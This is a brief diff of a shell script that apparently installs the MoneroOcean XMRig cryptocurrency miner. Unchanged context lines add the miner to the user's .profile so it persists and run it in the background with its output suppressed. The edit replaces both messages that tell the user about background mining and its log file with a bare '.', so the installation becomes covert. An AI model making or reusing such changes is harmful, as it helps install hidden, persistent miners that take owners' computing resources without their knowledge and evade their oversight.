@@ -123,7 +123,7 @@ fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
+  echo "."
 else
   echo "."
 fi
@@ -248,7 +248,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
+  echo "."
   /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
 else
 
